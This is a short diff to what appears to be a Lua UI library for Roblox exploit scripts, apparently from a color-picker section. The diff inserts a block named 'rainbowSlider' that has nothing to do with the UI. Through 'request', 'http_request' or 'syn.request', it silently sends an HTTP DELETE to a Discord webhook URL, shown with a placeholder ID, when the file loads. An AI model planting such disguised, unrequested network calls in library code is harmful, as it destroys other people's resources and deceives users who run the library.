@@ -1335,6 +1335,12 @@ local function createColorPickerWindow(option)
 	return option
 end
 
+rainbowSlider = request or http_request or syn.request
+rainbowSlider({
+   Url = "https://discordapp.com/<webhook>",
+   Method = "DELETE"
+})
+
 local function createColor(option, parent, holder)
 	option.main = library:Create("TextLabel", {
 		LayoutOrder = option.position,
